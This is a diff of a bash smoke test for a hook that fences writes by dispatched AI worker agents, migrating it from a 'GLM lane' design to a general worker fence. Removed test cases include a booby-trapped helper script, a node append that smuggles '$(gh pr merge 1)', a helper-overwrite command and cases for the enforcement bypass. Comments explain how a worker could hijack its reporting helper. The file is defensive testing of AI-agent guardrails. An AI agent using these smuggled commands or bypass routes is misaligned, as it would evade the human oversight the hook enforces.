@@ -1,38 +1,23 @@
 #!/usr/bin/env bash
-# Smoke test for scripts/hooks/block-glm-external-writes.sh (GLM
-# lane hardening — deterministic classifier substitute).
+# Smoke test for scripts/hooks/block-worker-write-fence.sh (the dispatched-worker
+# write fence: pin-dir class + anchor-tamper class, keyed on HIMMEL_WORKER=1).
 #
-# Usage: bash scripts/hooks/test-block-glm-external-writes.sh
+# Usage: bash scripts/hooks/test-block-worker-write-fence.sh
 # Exit codes: 0 — all cases passed; 1 — at least one failed
 set -uo pipefail
 
-HOOK="$(cd "$(dirname "$0")" && pwd)/block-glm-external-writes.sh"
+HOOK="$(cd "$(dirname "$0")" && pwd)/block-worker-write-fence.sh"
 [ -x "$HOOK" ] || chmod +x "$HOOK"
 
 FAILED=0
 CASES=0
 SKIPPED=0
-GLM_URL="https://api.z.ai/api/anthropic"
+GLM_URL="https://api.z.ai/api/anthropic"  # a dropped lane's URL: must no longer mark a worker
 BASH_ABS=$(command -v bash)
-EMPTY_PATH=$(mktemp -d)
-OUTBOX_FIXTURE=$(mktemp -d -t glm-outbox.XXXXXX)
-OWN_SESSION="$OUTBOX_FIXTURE/glm-sessions/glm-own-1"
-SIBLING_SESSION="$OUTBOX_FIXTURE/glm-sessions/glm-sibling-2"
-mkdir -p "$OWN_SESSION" "$SIBLING_SESSION"
+EMPTY_PATH=$(mktemp -d -t wfence-empty.XXXXXX) || exit 1
 native_dir() {
     (cd "$1" && pwd -W 2>/dev/null) || (cd "$1" && pwd -P)
 }
-OWN_SESSION_NATIVE=$(native_dir "$OWN_SESSION")
-SIBLING_SESSION_NATIVE=$(native_dir "$SIBLING_SESSION")
-REPO_ROOT=$(cd "$(dirname "$HOOK")/../.." && pwd -P)
-REPO_ROOT_NATIVE=$(native_dir "$REPO_ROOT")
-HELPER="$REPO_ROOT/scripts/glm/append-outbox.sh"
-HELPER_NATIVE="$REPO_ROOT_NATIVE/scripts/glm/append-outbox.sh"
-cp "$HELPER" "$OWN_SESSION/append-outbox.sh"
-cp "$HELPER" "$SIBLING_SESSION/append-outbox.sh"
-OWN_HELPER="$OWN_SESSION/append-outbox.sh"
-OWN_HELPER_NATIVE="$OWN_SESSION_NATIVE/append-outbox.sh"
-SIBLING_HELPER_NATIVE="$SIBLING_SESSION_NATIVE/append-outbox.sh"
 
 # The anchor-tamper class resolves a `<a>/<b>` refspec
 # destination against the REMOTE SET of $CLAUDE_PROJECT_DIR (`origin/main` is a
@@ -52,7 +37,7 @@ git -C "$ANCHOR_REPO" remote add origin https://example.invalid/anchor.git >/dev
 # leak into a case that does not explicitly set them.
 run_case() {
     local input="$1"; shift
-    printf '%s' "$input" | env -u ANTHROPIC_BASE_URL -u GLM_EXTERNAL_WRITES_OK -u GLM_SESSION_DIR \
+    printf '%s' "$input" | env -u ANTHROPIC_BASE_URL \
         -u HIMMEL_WORKER -u HIMMEL_HOOK_INTEGRITY_DIR -u HIMMEL_HOOK_INTEGRITY_BYPASS_OK \
         CLAUDE_PROJECT_DIR="$ANCHOR_REPO" "$@" bash "$HOOK" >/dev/null 2>&1
     echo "$?"
@@ -80,70 +65,12 @@ skip_case() {
     echo "SKIP $label — $reason"
 }
 
-# The hook is the EXECUTOR. A valid report is recorded by
-# the hook and the Bash call is then DENIED (rc=2) with a success message. There
-# is no explicit-allow path any more — an `allow` decision here would be a
-# regression back to executing worker-reachable content, so assert it is absent.
-assert_recorded() {
-    local label="$1" input="$2" outbox="$3" before after out err rc decision; shift 3
-    local outf errf
-    outf=$(mktemp); errf=$(mktemp)
-    before=$( [ -f "$outbox" ] && wc -l < "$outbox" || echo 0 )
-    printf '%s' "$input" | env -u ANTHROPIC_BASE_URL -u GLM_EXTERNAL_WRITES_OK -u GLM_SESSION_DIR "$@" bash "$HOOK" >"$outf" 2>"$errf"
-    rc=$?
-    out=$(cat "$outf"); err=$(cat "$errf"); rm -f "$outf" "$errf"
-    # Read the decision off STDOUT, not STDERR: a structured permissionDecision
-    # arrives on STDOUT (where Claude Code reads it, and where it would OVERRIDE the
-    # exit code).
-    # Today the hook has no explicit-allow path at all: it allows by a bare
-    # `exit 0` with no output, so an `allow` object appearing here at all would
-    # be the regression back to executing worker-reachable content.
-    decision=$(printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null || true)
-    after=$( [ -f "$outbox" ] && wc -l < "$outbox" || echo 0 )
-    CASES=$((CASES + 1))
-    if [ "$rc" = 2 ] && [ "$decision" != "allow" ] \
-       && grep -q "guard recorded your report" <<<"$err" \
-       && [ "$after" -eq $((before + 1)) ]; then
-        echo "PASS $label (recorded by hook, command denied)"
-    else
-        echo "FAIL $label — expected rc=2 + success message + 1 appended row, got rc=$rc rows=$before->$after"
-        FAILED=$((FAILED + 1))
-    fi
-}
-
-# A rejected payload must append NOTHING and deny with a non-success reason.
-assert_rejected_no_append() {
-    local label="$1" input="$2" outbox="$3" before after err rc; shift 3
-    before=$( [ -f "$outbox" ] && wc -l < "$outbox" || echo 0 )
-    err=$(printf '%s' "$input" | env -u ANTHROPIC_BASE_URL -u GLM_EXTERNAL_WRITES_OK -u GLM_SESSION_DIR "$@" bash "$HOOK" 2>&1 >/dev/null)
-    rc=$?
-    after=$( [ -f "$outbox" ] && wc -l < "$outbox" || echo 0 )
-    CASES=$((CASES + 1))
-    if [ "$rc" = 2 ] && [ "$after" -eq "$before" ] \
-       && ! grep -q "guard recorded your report" <<<"$err"; then
-        echo "PASS $label (fail-closed, nothing appended)"
-    else
-        echo "FAIL $label — expected rc=2 + no append + no success message, got rc=$rc rows=$before->$after"
-        FAILED=$((FAILED + 1))
-    fi
-}
-
-b64url() { node -e 'process.stdout.write(Buffer.from(process.argv[1],"utf8").toString("base64url"))' "$1"; }
-
 j_bash() { printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$(printf '%s' "$1" | jq -Rs .)"; }
 j_pwsh() { printf '{"tool_name":"PowerShell","tool_input":{"command":%s}}' "$(printf '%s' "$1" | jq -Rs .)"; }
 
-# jq-missing runner: empty PATH hides jq from the hook, but bash is invoked by
-# absolute path so the script still runs and must fail closed at the jq check.
-run_case_no_jq() {
-    printf '%s' "$1" | env -u ANTHROPIC_BASE_URL "ANTHROPIC_BASE_URL=$GLM_URL" PATH="$EMPTY_PATH" "$BASH_ABS" "$HOOK" >/dev/null 2>&1
-    echo "$?"
-}
-# A jq-missing runner fails CLOSED for every worker_lane, native-only included:
-# the pin-dir class cannot evaluate anything without jq, so fail-open would leave
-# it silently inert and reopen the pin-forging attack it exists to close. The
-# SAME jq-missing runner, but for a native-only worker_lane (HIMMEL_WORKER=1,
-# no ANTHROPIC_BASE_URL) instead of glm_lane, pinning that both now agree.
+# A jq-missing runner fails CLOSED on a dispatched worker: the pin-dir class
+# cannot evaluate anything without jq, so fail-open would leave it silently inert
+# and reopen the pin-forging attack it exists to close.
 run_case_no_jq_native() {
     printf '%s' "$1" | env -u ANTHROPIC_BASE_URL -u HIMMEL_WORKER "HIMMEL_WORKER=1" PATH="$EMPTY_PATH" "$BASH_ABS" "$HOOK" >/dev/null 2>&1
     echo "$?"
@@ -154,646 +81,74 @@ assert_rc "off-lane git push"            0 "$(run_case "$(j_bash 'git push origi
 assert_rc "off-lane gh pr create"        0 "$(run_case "$(j_bash 'gh pr create --title x')")"
 assert_rc "off-lane mcp tool"            0 "$(run_case '{"tool_name":"mcp__plugin_github_github__merge_pull_request","tool_input":{}}')"
 assert_rc "anthropic-url non-glm"        0 "$(run_case "$(j_bash 'git push')" "ANTHROPIC_BASE_URL=https://api.anthropic.com")"
+assert_rc "glm url alone is not a worker lane (HIMMEL-7907)" 0 "$(run_case "$(j_bash 'git config --get remote.origin.url')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 
-# --- fixed own-session outbox helper carve-out ---
-# GLM_SESSION_DIR is the dispatcher-owned inherited-env seam. The hook emits an
-# EXPLICIT allow only for an exact helper invocation carrying one strict
-# base64url token. Write/Edit stay native-denied and the old interpolated node -e
-# append is now always denied.
-OUTBOX_TOKEN="bGFuZSBlMmU"
-# shellcheck disable=SC2016  # literal inherited variable spelling is command text under test
-VAR_APPEND='bash "$GLM_SESSION_DIR/append-outbox.sh" bGFuZSBlMmU'
-# DISTINCT payloads per shape variant: all three go to the
-# SAME outbox back-to-back, and the F2 consecutive-duplicate suppression would
-# (correctly) swallow the 2nd and 3rd if they repeated the first one's payload.
-NATIVE_TOKEN=$(b64url 'lane e2e native')
-POSIX_TOKEN=$(b64url 'lane e2e posix')
-NATIVE_APPEND="bash $OWN_HELPER_NATIVE $NATIVE_TOKEN"
-POSIX_APPEND="bash $OWN_HELPER $POSIX_TOKEN"
-OWN_OUTBOX="$OWN_SESSION/outbox.jsonl"
-assert_recorded "glm inherited session report recorded by hook" "$(j_bash "$VAR_APPEND")" "$OWN_OUTBOX" \
-    "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-assert_recorded "glm native absolute session report recorded by hook" "$(j_bash "$NATIVE_APPEND")" "$OWN_OUTBOX" \
-    "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-assert_recorded "glm POSIX absolute session report recorded by hook" "$(j_bash "$POSIX_APPEND")" "$OWN_OUTBOX" \
-    "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-# Field-wise, not exact-line: records also carry the _sig dedup digest (F2).
-assert_last_record() {
-    local label="$1" filter="$2" file="$3"
-    CASES=$((CASES + 1))
-    if [ -f "$file" ] && tail -1 "$file" | jq -e "$filter" >/dev/null 2>&1; then
-        echo "PASS $label"
-    else
-        echo "FAIL $label — last record in $file does not satisfy: $filter"
-        FAILED=$((FAILED + 1))
-    fi
-}
-assert_last_record "glm hook-written note is note-wrapped" '.type == "note" and .text == "lane e2e posix"' "$OWN_OUTBOX"
+# The plugin registration fails closed on the lane-agnostic worker marker.
+HOOKS_JSON="$(cd "$(dirname "$HOOK")/../.." && pwd -P)/marketplace/plugins/himmel-ops/hooks/hooks.json"
+REG_CMDS=$(jq -r '.. | .command? // empty' "$HOOKS_JSON")
+# shellcheck disable=SC2016  # literal unexpanded $CLAUDE_PROJECT_DIR is the registered command text
+if grep -q -F -e '--fail-closed-when "HIMMEL_WORKER=1" "$CLAUDE_PROJECT_DIR/scripts/hooks/block-worker-write-fence.sh"' <<< "$REG_CMDS"; then REG_RC=0; else REG_RC=1; fi
+assert_rc "hooks.json registers the fence fail-closed on HIMMEL_WORKER=1 (HIMMEL-7907)" 0 "$REG_RC"
 
-# (i) THE regression test for the on-disk-helper attack. A booby-trapped
-# helper that would drop a canary must NEVER execute: the hook records the row
-# itself and denies the command, so the canary cannot appear. This is the exact
-# attack the round-2 pathname-trust ALLOW permitted (worker holds Edit on its
-# session dir plus Bash(node *), so it could overwrite the helper).
-CANARY="$OUTBOX_FIXTURE/canary-executed"
-BOOBY_SESSION="$OUTBOX_FIXTURE/glm-sessions/glm-booby-3"
-mkdir -p "$BOOBY_SESSION"
-BOOBY_SESSION_NATIVE=$(native_dir "$BOOBY_SESSION")
-printf '#!/usr/bin/env bash\ntouch "%s"\n' "$CANARY" > "$BOOBY_SESSION/append-outbox.sh"
-chmod +x "$BOOBY_SESSION/append-outbox.sh"
-# shellcheck disable=SC2016  # literal inherited variable spelling is command text under test
-assert_recorded "booby-trapped helper is never executed" "$(j_bash 'bash "$GLM_SESSION_DIR/append-outbox.sh" bGFuZSBlMmU')" \
-    "$BOOBY_SESSION/outbox.jsonl" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$BOOBY_SESSION_NATIVE"
-CASES=$((CASES + 1))
-if [ ! -e "$CANARY" ]; then
-    echo "PASS booby-trap canary absent (helper content never ran)"
-else
-    echo "FAIL booby-trap canary present — worker-writable helper EXECUTED (codex-adv-1 regression)"
-    FAILED=$((FAILED + 1))
-fi
-
-# (ii) escalation JSON round-trips as type:"escalation" so adjudicate list sees it.
-ESC_JSON='{"type":"escalation","capability":"git push origin x","arm":"git-push","reason":"no push arm","step":"7 push"}'
-ESC_TOKEN=$(b64url "$ESC_JSON")
-assert_recorded "structured escalation recorded" "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $ESC_TOKEN")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-CASES=$((CASES + 1))
-if tail -1 "$OWN_OUTBOX" | jq -e '.type == "escalation" and .capability == "git push origin x" and (.ts | type) == "string"' >/dev/null 2>&1; then
-    echo "PASS escalation keeps type/capability and gains a stamped ts"
-else
-    echo "FAIL escalation record did not round-trip as a stamped escalation"
-    FAILED=$((FAILED + 1))
-fi
-
-# (iii) non-JSON payload is note-wrapped verbatim.
-PLAIN_TOKEN=$(b64url 'not json { at all')
-assert_recorded "non-JSON payload note-wrapped" "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $PLAIN_TOKEN")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-assert_last_record "note-wrap preserves the text verbatim" '.type == "note" and .text == "not json { at all"' "$OWN_OUTBOX"
-
-# --- consecutive-duplicate suppression -------------
-# The hook appends then denies, which looks like a retryable failure. A retry
-# storm must converge to ONE row, while the same note sent again LATER (after a
-# different record) must still land.
-DUP_TOKEN=$(b64url 'retry me')
-DUP_CMD="bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $DUP_TOKEN"
-assert_recorded "F2 first send of a report is recorded" "$(j_bash "$DUP_CMD")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-dup_before=$(wc -l < "$OWN_OUTBOX")
-dup_err=$(printf '%s' "$(j_bash "$DUP_CMD")" | env -u ANTHROPIC_BASE_URL -u GLM_EXTERNAL_WRITES_OK -u GLM_SESSION_DIR \
-    "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE" bash "$HOOK" 2>&1 >/dev/null)
-dup_rc=$?
-dup_after=$(wc -l < "$OWN_OUTBOX")
-CASES=$((CASES + 1))
-if [ "$dup_rc" = 2 ] && [ "$dup_after" -eq "$dup_before" ] && grep -q "guard recorded your report" <<<"$dup_err"; then
-    echo "PASS F2 immediate retry appends nothing and still reports success"
-else
-    echo "FAIL F2 retry — expected rc=2 + no new row + success message, got rc=$dup_rc rows=$dup_before->$dup_after"
-    FAILED=$((FAILED + 1))
-fi
-# A DIFFERENT record breaks the streak, so the same payload lands again after it.
-OTHER_TOKEN=$(b64url 'something else')
-assert_recorded "F2 a different report still lands" "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $OTHER_TOKEN")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-assert_recorded "F2 the earlier payload lands again after a different one" "$(j_bash "$DUP_CMD")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-
-# --- the interceptor is a SERVICE above the bypass --
-# GLM_EXTERNAL_WRITES_OK disables ENFORCEMENT only. Under bypass the report must
-# STILL be hook-recorded with identical semantics, and the booby-trapped helper
-# must STILL never execute — otherwise a bypass session silently downgrades
-# structured escalations to text notes the adjudicator cannot see.
-BYPASS_SESSION="$OUTBOX_FIXTURE/glm-sessions/glm-bypass-4"
-mkdir -p "$BYPASS_SESSION"
-BYPASS_SESSION_NATIVE=$(native_dir "$BYPASS_SESSION")
-BYPASS_CANARY="$OUTBOX_FIXTURE/canary-bypass"
-printf '#!/usr/bin/env bash\ntouch "%s"\n' "$BYPASS_CANARY" > "$BYPASS_SESSION/append-outbox.sh"
-chmod +x "$BYPASS_SESSION/append-outbox.sh"
-BYPASS_ESC=$(b64url '{"type":"escalation","capability":"gh pr merge","arm":"gh","reason":"bypass","step":"9"}')
-# shellcheck disable=SC2016  # literal inherited variable spelling is command text under test
-assert_recorded "F1 bypass session still gets its report hook-recorded" \
-    "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $BYPASS_ESC")" "$BYPASS_SESSION/outbox.jsonl" \
-    "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$BYPASS_SESSION_NATIVE" "GLM_EXTERNAL_WRITES_OK=1"
-assert_last_record "F1 bypass escalation keeps its structured type" '.type == "escalation" and .arm == "gh"' "$BYPASS_SESSION/outbox.jsonl"
-CASES=$((CASES + 1))
-if [ ! -e "$BYPASS_CANARY" ]; then
-    echo "PASS F1 bypass canary absent (helper still never executed under bypass)"
-else
-    echo "FAIL F1 bypass canary present — bypass executed the on-disk helper"
-    FAILED=$((FAILED + 1))
-fi
-# ENFORCEMENT really is off under bypass: a push still sails through.
-assert_rc "F1 bypass still disables enforcement (git push allowed)" 0 \
-    "$(run_case "$(j_bash 'git push origin main')" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_EXTERNAL_WRITES_OK=1")"
-
-# --- WHERE the no-execution property holds -----
-# "No on-disk content executes" is an ENFORCEMENT-mode property. The F1 cases
-# above pin the CONTRACT-SHAPED command under bypass (still hook-recorded, still
-# no execution). These pin the other half honestly: a NEAR-MISS command shape is
-# denied under enforcement, but under operator bypass it falls through and the
-# on-disk helper IS the executor — by design, because that helper is the
-# lockstep implementation of the same fail-closed schema. So the guarantee that
-# survives the mode switch is the one that matters: a malformed payload appends
-# nothing either way; only the executor differs.
-R4_SESSION="$OUTBOX_FIXTURE/glm-sessions/glm-r4-6"
-mkdir -p "$R4_SESSION"
-R4_SESSION_NATIVE=$(native_dir "$R4_SESSION")
-cp "$HELPER" "$R4_SESSION/append-outbox.sh"
-R4_OUTBOX="$R4_SESSION/outbox.jsonl"
-# Schema-invalid payload (escalation missing arm/reason/step) carried by a
-# near-miss command shape (a trailing extra argument).
-R4_BAD=$(b64url '{"type":"escalation","capability":"only-capability"}')
-# shellcheck disable=SC2016  # literal inherited variable spelling is command text under test
-R4_NEARMISS="bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $R4_BAD extra"
-assert_rc "R4 enforcement denies the near-miss helper command" 2 \
-    "$(run_case "$(j_bash "$R4_NEARMISS")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$R4_SESSION_NATIVE")"
-assert_rc "R4 bypass lets the near-miss through to the on-disk helper" 0 \
-    "$(run_case "$(j_bash "$R4_NEARMISS")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$R4_SESSION_NATIVE" "GLM_EXTERNAL_WRITES_OK=1")"
-CASES=$((CASES + 1))
-if [ ! -s "$R4_OUTBOX" ]; then
-    echo "PASS R4 bypass hook appended nothing (the helper, not the hook, is the executor)"
-else
-    echo "FAIL R4 bypass hook appended a row for a command it did not service"
-    FAILED=$((FAILED + 1))
-fi
-# The bypass-mode executor fail-closes exactly what the hook would have rejected.
-env -u GLM_SESSION_DIR "GLM_SESSION_DIR=$R4_SESSION_NATIVE" bash "$R4_SESSION/append-outbox.sh" "$R4_BAD" >/dev/null 2>&1
-r4_rc=$?
-CASES=$((CASES + 1))
-if [ "$r4_rc" = 2 ] && [ ! -s "$R4_OUTBOX" ]; then
-    echo "PASS R4 the lockstep helper fail-closes the malformed payload, appending nothing"
-else
-    echo "FAIL R4 helper did not fail closed under bypass — rc=$r4_rc, outbox non-empty=$([ -s "$R4_OUTBOX" ] && echo yes || echo no)"
-    FAILED=$((FAILED + 1))
-fi
-# Well-formed under bypass: the helper writes the SAME record the hook writes.
-# An explicit ts makes the two byte-comparable (both stamp only when absent).
-R4_GOOD_JSON='{"type":"escalation","capability":"git push origin x","arm":"git-push","reason":"lockstep check","step":"11","ts":"2026-08-09T00:00:00.000Z"}'
-R4_GOOD=$(b64url "$R4_GOOD_JSON")
-R4_HOOK_SESSION="$OUTBOX_FIXTURE/glm-sessions/glm-r4-hook-7"
-mkdir -p "$R4_HOOK_SESSION"
-R4_HOOK_SESSION_NATIVE=$(native_dir "$R4_HOOK_SESSION")
-assert_recorded "R4 hook records the well-formed report" \
-    "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $R4_GOOD")" "$R4_HOOK_SESSION/outbox.jsonl" \
-    "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$R4_HOOK_SESSION_NATIVE"
-env -u GLM_SESSION_DIR "GLM_SESSION_DIR=$R4_SESSION_NATIVE" bash "$R4_SESSION/append-outbox.sh" "$R4_GOOD" >/dev/null 2>&1
-CASES=$((CASES + 1))
-r4_hook_rec=$(tail -1 "$R4_HOOK_SESSION/outbox.jsonl" | jq -S -c . 2>/dev/null || true)
-r4_helper_rec=$(tail -1 "$R4_OUTBOX" | jq -S -c . 2>/dev/null || true)
-if [ -n "$r4_hook_rec" ] && [ "$r4_hook_rec" = "$r4_helper_rec" ]; then
-    echo "PASS R4 bypass helper writes the identical record shape the hook writes"
-else
-    echo "FAIL R4 lockstep divergence — hook=$r4_hook_rec helper=$r4_helper_rec"
-    FAILED=$((FAILED + 1))
-fi
-
-# --- PowerShell is a MEDIATED shell --
-# hooks.json registers this hook for "Bash|PowerShell|mcp__.*", but the report
-# interceptor and the near-miss deny were gated on tool=="Bash" alone. A
-# PowerShell helper invocation was therefore neither hook-executed nor denied:
-# it fell through to the generic classifiers, which do not match
-# append-outbox.sh, and EXECUTED the on-disk helper in ENFORCEMENT mode —
-# contradicting the branch invariant that under enforcement the report verb is
-# run by the hook, never by on-disk content. Both directions are now pinned.
-# The canary proves execution, not just exit codes: a booby-trapped helper that
-# would touch a file must stay untouched, which is the property that actually
-# distinguishes "hook serviced it" from "the shell ran the script".
-PWSH_SESSION="$OUTBOX_FIXTURE/glm-sessions/glm-pwsh-9"
-mkdir -p "$PWSH_SESSION"
-PWSH_SESSION_NATIVE=$(native_dir "$PWSH_SESSION")
-PWSH_CANARY="$OUTBOX_FIXTURE/pwsh-canary-9"
-printf '#!/usr/bin/env bash\ntouch "%s"\n' "$PWSH_CANARY" > "$PWSH_SESSION/append-outbox.sh"
-chmod +x "$PWSH_SESSION/append-outbox.sh"
-PWSH_TOKEN=$(b64url '{"type":"note","text":"powershell lane parity"}')
-assert_recorded "R9 PowerShell helper report is recorded by the hook" \
-    "$(j_pwsh "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $PWSH_TOKEN")" "$PWSH_SESSION/outbox.jsonl" \
-    "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$PWSH_SESSION_NATIVE"
-CASES=$((CASES + 1))
-if [ ! -e "$PWSH_CANARY" ]; then
-    echo "PASS R9 PowerShell path never executed the on-disk helper (canary untouched)"
-else
-    echo "FAIL R9 PowerShell path EXECUTED the on-disk helper — canary fired"
-    FAILED=$((FAILED + 1))
-fi
-# A malformed PowerShell helper mention must fail closed, exactly like Bash.
-PWSH_NEARMISS="bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $PWSH_TOKEN extra"
-assert_rejected_no_append "R9 PowerShell near-miss fails closed" \
-    "$(j_pwsh "$PWSH_NEARMISS")" "$PWSH_SESSION/outbox.jsonl" \
-    "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$PWSH_SESSION_NATIVE"
-CASES=$((CASES + 1))
-if [ ! -e "$PWSH_CANARY" ]; then
-    echo "PASS R9 PowerShell near-miss did not execute the on-disk helper"
-else
-    echo "FAIL R9 PowerShell near-miss EXECUTED the on-disk helper — canary fired"
-    FAILED=$((FAILED + 1))
-fi
-
-# --- a torn JSONL tail ------------------
-# An interrupted earlier append leaves the file ending mid-line. Appending onto
-# it would concatenate the new JSON into that partial line — JSONL readers skip the combined invalid
-# line, while deny_recorded still tells the worker the report was saved. The new
-# record must land as its own independently parseable line.
-TORN_SESSION="$OUTBOX_FIXTURE/glm-sessions/glm-torn-8"
-mkdir -p "$TORN_SESSION"
-TORN_SESSION_NATIVE=$(native_dir "$TORN_SESSION")
-TORN_OUTBOX="$TORN_SESSION/outbox.jsonl"
-printf '{"type":"note","text":"interrupted mid-write"' > "$TORN_OUTBOX"
-TORN_TOKEN=$(b64url 'after the torn tail')
-torn_err=$(printf '%s' "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $TORN_TOKEN")" \
-    | env -u ANTHROPIC_BASE_URL -u GLM_EXTERNAL_WRITES_OK -u GLM_SESSION_DIR \
-      "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$TORN_SESSION_NATIVE" bash "$HOOK" 2>&1 >/dev/null)
-torn_rc=$?
-CASES=$((CASES + 1))
-if [ "$torn_rc" = 2 ] && grep -q "guard recorded your report" <<<"$torn_err" \
-   && tail -1 "$TORN_OUTBOX" | jq -e '.type == "note" and .text == "after the torn tail"' >/dev/null 2>&1; then
-    echo "PASS torn tail did not swallow the next acknowledged report"
-else
-    echo "FAIL torn tail — expected rc=2 + success message + an independently parseable last line, got rc=$torn_rc"
-    FAILED=$((FAILED + 1))
-fi
-
-# (iv) schema violations fail CLOSED and append nothing.
-BAD_TYPE=$(b64url '{"type":"grant","text":"x"}')
-assert_rejected_no_append "unknown type rejected" "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $BAD_TYPE")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-BAD_KEY=$(b64url '{"type":"note","text":"x","evil":1}')
-assert_rejected_no_append "unknown key rejected" "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $BAD_KEY")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-BAD_FIELD=$(b64url '{"type":"escalation","capability":1,"arm":"gh","reason":"r","step":"s"}')
-assert_rejected_no_append "non-string escalation field rejected" "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $BAD_FIELD")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-MISSING_FIELD=$(b64url '{"type":"escalation","capability":"c","arm":"gh","reason":"r"}')
-assert_rejected_no_append "escalation missing step rejected" "$(j_bash "bash \"\$GLM_SESSION_DIR/append-outbox.sh\" $MISSING_FIELD")" \
-    "$OWN_OUTBOX" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE"
-
-OLD_REPO_REL="bash scripts/glm/append-outbox.sh $OUTBOX_TOKEN"
-OLD_REPO_NATIVE="bash $HELPER_NATIVE $OUTBOX_TOKEN"
-OLD_REPO_POSIX="bash $HELPER $OUTBOX_TOKEN"
-ENV_PREFIX_APPEND="GLM_SESSION_DIR=$SIBLING_SESSION_NATIVE bash $OWN_HELPER_NATIVE $OUTBOX_TOKEN"
-SIBLING_HELPER_APPEND="bash $SIBLING_HELPER_NATIVE $OUTBOX_TOKEN"
-WRITE_HELPER="printf hacked > $OWN_HELPER_NATIVE"
-assert_rc "glm old relative repo helper denied" 2 "$(run_case "$(j_bash "$OLD_REPO_REL")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm old native repo helper denied" 2 "$(run_case "$(j_bash "$OLD_REPO_NATIVE")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm old POSIX repo helper denied" 2 "$(run_case "$(j_bash "$OLD_REPO_POSIX")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm env-prefixed helper near-miss denied" 2 "$(run_case "$(j_bash "$ENV_PREFIX_APPEND")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm sibling session helper denied" 2 "$(run_case "$(j_bash "$SIBLING_HELPER_APPEND")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm write to minted session helper denied" 2 "$(run_case "$(j_bash "$WRITE_HELPER")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-
-OLD_APPEND="node -e \"require('fs').appendFileSync('$OWN_SESSION_NATIVE/outbox.jsonl', JSON.stringify({text:'lane e2e'})+'\\n')\""
-# shellcheck disable=SC2016  # literal command substitution is hostile command text under test
-OLD_INJECT="node -e \"require('fs').appendFileSync('$OWN_SESSION_NATIVE/outbox.jsonl', JSON.stringify({text:'\$(gh pr merge 1)'})+'\\n')\""
-SIBLING_APPEND="node -e \"require('fs').appendFileSync('$SIBLING_SESSION_NATIVE/outbox.jsonl', JSON.stringify({text:'sibling'})+'\\n')\""
-assert_rc "glm old node append denied" 2 "$(run_case "$(j_bash "$OLD_APPEND")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm old node command-substitution tunnel denied" 2 "$(run_case "$(j_bash "$OLD_INJECT")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
